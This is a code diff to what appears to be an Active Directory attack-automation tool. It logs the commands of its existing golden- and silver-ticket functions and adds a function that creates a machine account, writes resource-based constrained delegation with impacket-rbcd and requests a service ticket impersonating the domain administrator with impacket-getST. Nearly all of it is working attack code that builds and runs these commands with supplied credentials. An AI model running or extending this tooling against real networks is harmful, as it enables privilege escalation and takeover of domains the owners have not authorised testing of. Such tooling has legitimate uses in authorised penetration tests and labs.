@@ -1,6 +1,7 @@
 import os 
 import config
 import re
+from mods import dacl
 
 def asreproast(box, path):
     """
@@ -184,6 +185,7 @@ def golden_ticket(box, path):
         print(f'\033[91m[!]\033[0m Need NT hash or AES key for golden ticket!')
         exit()
     print(f'\033[96m[$]\033[0m {cmd}')
+    config.log_cmd(cmd)
     os.system(cmd)
     print('\033[92m[+]\033[0m Golden ticket\n')
 
@@ -205,5 +207,29 @@ def silver_ticket(box, path):
         print(f'\033[91m[!]\033[0m Need NT hash or AES key for silver ticket!')
         exit()
     print(f'\033[96m[$]\033[0m {cmd}')
+    config.log_cmd(cmd)
     os.system(cmd)
     print('\033[92m[+]\033[0m Silver ticket\n')
+
+def rbcd(box,path):
+    config.required_creds(box)
+    config.required_target(box)
+    os.chdir(path.ws_ccache)
+    computer_name = 'RBCDPC'
+    computer_password = dacl.addcomputer(box,computer_name)
+    target = box.target.replace("$", "").upper()
+    print('\033[93m[*]\033[0m Resource Based Constrained Delegation')
+    if box.krb:
+        cmd1 = f"{box.krb} impacket-rbcd {box.domain}/ -dc-host {box.fqdn} -delegate-from '{computer_name}$' -delegate-to '{box.target}$' -action write"
+    elif box.nt_hash:
+        cmd1 = f"impacket-rbcd {box.domain}/{box.username} -hashes :{box.nt_hash} -delegate-from '{computer_name}$' -delegate-to '{box.target}$' -action write"
+    else:
+        cmd1 = f"impacket-rbcd {box.domain}/{box.username}:'{box.password}' -delegate-from '{computer_name}$' -delegate-to '{box.target}$' -action write"
+    os.system(f'sudo ntpdate {box.fqdn} > /dev/null 2>&1')
+    cmd2 = f"impacket-getST {box.domain}/'{computer_name}$':'{computer_password}' -spn host/{target.lower()}.{box.domain} -impersonate administrator"
+    config.log_cmd([cmd1,cmd2])
+    print(f'\033[96m[$]\033[0m {cmd1}')
+    os.system(cmd1)
+    print(f'\033[96m[$]\033[0m {cmd2}')
+    os.system(cmd2)
+    print('\033[92m[+]\033[0m Resource Based Constrained Delegation\n')
